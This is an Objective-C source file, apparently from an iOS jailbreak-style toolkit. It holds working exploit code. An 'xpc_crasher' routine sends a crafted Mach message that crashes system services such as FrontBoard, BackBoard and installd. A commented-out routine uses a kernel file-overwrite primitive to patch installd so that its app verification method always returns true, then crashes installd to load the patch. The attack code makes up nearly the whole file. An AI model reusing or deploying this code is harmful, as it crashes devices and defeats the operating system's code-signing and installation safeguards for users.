#import <Foundation/Foundation.h>
#include <string.h>
#include <mach/mach.h>
#include <dirent.h>
#include "fun.h"

char* get_temp_file_path(void) {
  return strdup([[NSTemporaryDirectory() stringByAppendingPathComponent:@"AAAAs"] fileSystemRepresentation]);
}

// create a read-only test file we can target:
char* set_up_tmp_file(void) {
  char* path = get_temp_file_path();
  printf("path: %s\n", path);
  
  FILE* f = fopen(path, "w");
  if (!f) {
    printf("opening the tmp file failed...\n");
    return NULL;
  }
  char* buf = malloc(PAGE_SIZE*10);
  memset(buf, 'A', PAGE_SIZE*10);
  fwrite(buf, PAGE_SIZE*10, 1, f);
  //fclose(f);
  return path;
}

kern_return_t
bootstrap_look_up(mach_port_t bp, const char* service_name, mach_port_t *sp);

struct xpc_w00t {
  mach_msg_header_t hdr;
  mach_msg_body_t body;
  mach_msg_port_descriptor_t client_port;
  mach_msg_port_descriptor_t reply_port;
};

mach_port_t get_send_once(mach_port_t recv) {
  mach_port_t so = MACH_PORT_NULL;
  mach_msg_type_name_t type = 0;
  kern_return_t err = mach_port_extract_right(mach_task_self(), recv, MACH_MSG_TYPE_MAKE_SEND_ONCE, &so, &type);
  if (err != KERN_SUCCESS) {
    printf("port right extraction failed: %s\n", mach_error_string(err));
    return MACH_PORT_NULL;
  }
  printf("made so: 0x%x from recv: 0x%x\n", so, recv);
  return so;
}

// copy-pasted from an exploit I wrote in 2019...
// still works...

// (in the exploit for this: https://googleprojectzero.blogspot.com/2019/04/splitting-atoms-in-xnu.html )

void xpc_crasher(char* service_name) {
  mach_port_t client_port = MACH_PORT_NULL;
  mach_port_t reply_port = MACH_PORT_NULL;

  mach_port_t service_port = MACH_PORT_NULL;

  kern_return_t err = bootstrap_look_up(bootstrap_port, service_name, &service_port);
  if(err != KERN_SUCCESS){
//    printf("err%i", err);
    printf("unable to look up %s\n", service_name);
    return;
  }

  if (service_port == MACH_PORT_NULL) {
    printf("bad service port\n");
    return;
  }

  // allocate the client and reply port:
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &client_port);
  if (err != KERN_SUCCESS) {
    printf("port allocation failed: %s\n", mach_error_string(err));
    return;
  }

  mach_port_t so0 = get_send_once(client_port);
  mach_port_t so1 = get_send_once(client_port);

  // insert a send so we maintain the ability to send to this port
  err = mach_port_insert_right(mach_task_self(), client_port, client_port, MACH_MSG_TYPE_MAKE_SEND);
  if (err != KERN_SUCCESS) {
    printf("port right insertion failed: %s\n", mach_error_string(err));
    return;
  }

  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
  if (err != KERN_SUCCESS) {
    printf("port allocation failed: %s\n", mach_error_string(err));
    return;
  }

  struct xpc_w00t msg;
  memset(&msg.hdr, 0, sizeof(msg));
  msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
  msg.hdr.msgh_size = sizeof(msg);
  msg.hdr.msgh_remote_port = service_port;
  msg.hdr.msgh_id   = 'w00t';

  msg.body.msgh_descriptor_count = 2;

  msg.client_port.name        = client_port;
  msg.client_port.disposition = MACH_MSG_TYPE_MOVE_RECEIVE; // we still keep the send
  msg.client_port.type        = MACH_MSG_PORT_DESCRIPTOR;

  msg.reply_port.name        = reply_port;
  msg.reply_port.disposition = MACH_MSG_TYPE_MAKE_SEND;
  msg.reply_port.type        = MACH_MSG_PORT_DESCRIPTOR;

  err = mach_msg(&msg.hdr,
                 MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                 msg.hdr.msgh_size,
                 0,
                 MACH_PORT_NULL,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);

  if (err != KERN_SUCCESS) {
    printf("w00t message send failed: %s\n", mach_error_string(err));
    return;
  } else {
    printf("sent xpc w00t message\n");
  }

  mach_port_deallocate(mach_task_self(), so0);
  mach_port_deallocate(mach_task_self(), so1);

  return;
}

void respringFrontboard(void) {
  xpc_crasher("com.apple.frontboard.systemappservices");
  exit(0);
}

void respringBackboard(void) {
  xpc_crasher("com.apple.backboard.TouchDeliveryPolicyServer");
}

//static uint64_t patchfind_get_padding(struct segment_command_64* segment) {
//  struct section_64* section_array = ((void*)segment) + sizeof(struct segment_command_64);
//  struct section_64* last_section = &section_array[segment->nsects - 1];
//  return last_section->offset + last_section->size;
//}
//
//static bool patchfind_sections(void* executable_map,
//                               struct segment_command_64** data_const_segment_out,
//                               struct symtab_command** symtab_out,
//                               struct dysymtab_command** dysymtab_out) {
//  struct mach_header_64* executable_header = executable_map;
//  struct load_command* load_command = executable_map + sizeof(struct mach_header_64);
//  for (int load_command_index = 0; load_command_index < executable_header->ncmds;
//       load_command_index++) {
//    switch (load_command->cmd) {
//      case LC_SEGMENT_64: {
//        struct segment_command_64* segment = (struct segment_command_64*)load_command;
//        if (strcmp(segment->segname, "__DATA_CONST") == 0) {
//          *data_const_segment_out = segment;
//        }
//        break;
//      }
//      case LC_SYMTAB: {
//        *symtab_out = (struct symtab_command*)load_command;
//        break;
//      }
//      case LC_DYSYMTAB: {
//        *dysymtab_out = (struct dysymtab_command*)load_command;
//        break;
//      }
//    }
//    load_command = ((void*)load_command) + load_command->cmdsize;
//  }
//  return true;
//}
//
//struct installd_remove_app_limit_offsets {
//  uint64_t offset_objc_method_list_t_MIInstallableBundle;
//  uint64_t offset_objc_class_rw_t_MIInstallableBundle_baseMethods;
//  uint64_t offset_data_const_end_padding;
//  // MIUninstallRecord::supportsSecureCoding
//  uint64_t offset_return_true;
//};
//
//struct installd_remove_app_limit_offsets gAppLimitOffsets = {
//    .offset_objc_method_list_t_MIInstallableBundle = 0x519b0,
//    .offset_objc_class_rw_t_MIInstallableBundle_baseMethods = 0x804e8,
//    .offset_data_const_end_padding = 0x79c38,
//    .offset_return_true = 0x19860,
//};
//
//static uint64_t patchfind_find_class_rw_t_baseMethods(void* executable_map,
//                                                      size_t executable_length,
//                                                      const char* needle) {
//  void* str_offset = memmem(executable_map, executable_length, needle, strlen(needle) + 1);
//  if (!str_offset) {
//    return 0;
//  }
//  uint64_t str_file_offset = str_offset - executable_map;
//  for (int i = 0; i < executable_length - 8; i += 8) {
//    uint64_t val = *(uint64_t*)(executable_map + i);
//    if ((val & 0xfffffffful) != str_file_offset) {
//      continue;
//    }
//    // baseMethods
//    if (*(uint64_t*)(executable_map + i + 8) != 0) {
//      return i + 8;
//    }
//  }
//  return 0;
//}
//
//static uint64_t patchfind_return_true(void* executable_map, size_t executable_length) {
//  // mov w0, #1
//  // ret
//  static const char needle[] = {0x20, 0x00, 0x80, 0x52, 0xc0, 0x03, 0x5f, 0xd6};
//  void* offset = memmem(executable_map, executable_length, needle, sizeof(needle));
//  if (!offset) {
//    return 0;
//  }
//  return offset - executable_map;
//}
//
//static bool patchfind_installd(void* executable_map, size_t executable_length,
//                               struct installd_remove_app_limit_offsets* offsets) {
//  struct segment_command_64* data_const_segment = nil;
//  struct symtab_command* symtab_command = nil;
//  struct dysymtab_command* dysymtab_command = nil;
//  if (!patchfind_sections(executable_map, &data_const_segment, &symtab_command,
//                          &dysymtab_command)) {
//    printf("no sections\n");
//    return false;
//  }
//  if ((offsets->offset_data_const_end_padding = patchfind_get_padding(data_const_segment)) == 0) {
//    printf("no padding\n");
//    return false;
//  }
//  if ((offsets->offset_objc_class_rw_t_MIInstallableBundle_baseMethods =
//           patchfind_find_class_rw_t_baseMethods(executable_map, executable_length,
//                                                 "MIInstallableBundle")) == 0) {
//    printf("no MIInstallableBundle class_rw_t\n");
//    return false;
//  }
//  offsets->offset_objc_method_list_t_MIInstallableBundle =
//      (*(uint64_t*)(executable_map +
//                    offsets->offset_objc_class_rw_t_MIInstallableBundle_baseMethods)) &
//      0xffffffull;
//
//  if ((offsets->offset_return_true = patchfind_return_true(executable_map, executable_length)) ==
//      0) {
//    printf("no return true\n");
//    return false;
//  }
//  return true;
//}
//
//static NSData* make_patch_installd(void* executableMap, size_t executableLength) {
//  struct installd_remove_app_limit_offsets offsets = {};
//  if (!patchfind_installd(executableMap, executableLength, &offsets)) {
//    return nil;
//  }
//
//  NSMutableData* data = [NSMutableData dataWithBytes:executableMap length:executableLength];
//  char* mutableBytes = data.mutableBytes;
//  uint64_t current_empty_space = offsets.offset_data_const_end_padding;
//  uint64_t copied_size = 0;
//  uint64_t new_method_list_offset = current_empty_space;
//  patch_copy_objc_method_list(mutableBytes, offsets.offset_objc_method_list_t_MIInstallableBundle,
//                              current_empty_space, &copied_size,
//                              ^(const char* sel, uint64_t* inout_address) {
//                                if (strcmp(sel, "performVerificationWithError:") != 0) {
//                                  return;
//                                }
//                                *inout_address = offsets.offset_return_true;
//                              });
//  current_empty_space += copied_size;
//  ((struct
//    dyld_chained_ptr_arm64e_auth_rebase*)(mutableBytes +
//                                          offsets
//                                              .offset_objc_class_rw_t_MIInstallableBundle_baseMethods))
//      ->target = new_method_list_offset;
//  return data;
//}
//
//bool patch_installd() {
//  const char* targetPath = "/usr/libexec/installd";
//  int fd = open(targetPath, O_RDONLY | O_CLOEXEC);
//  off_t targetLength = lseek(fd, 0, SEEK_END);
//  lseek(fd, 0, SEEK_SET);
//  void* targetMap = mmap(nil, targetLength, PROT_READ, MAP_SHARED, fd, 0);
//
//  NSData* originalData = [NSData dataWithBytes:targetMap length:targetLength];
//  NSData* sourceData = make_patch_installd(targetMap, targetLength);
//  if (!sourceData) {
//    NSLog(@"can't patchfind");
//    return false;
//  }
//
//  if (!funVnodeOverwrite(kfd, fd, sourceData)) {
//    funVnodeOverwrite(kfd, fd, originalData);
//    munmap(targetMap, targetLength);
//    NSLog(@"can't overwrite");
//    return false;
//  }
//  munmap(targetMap, targetLength);
//  xpc_crasher("com.apple.mobile.installd");
//  sleep(1);
//
//  // TODO(zhuowei): for now we revert it once installd starts
//  // so the change will only last until when this installd exits
//  funVnodeOverwrite(kfd, fd, originalData);
//  return true;
//}
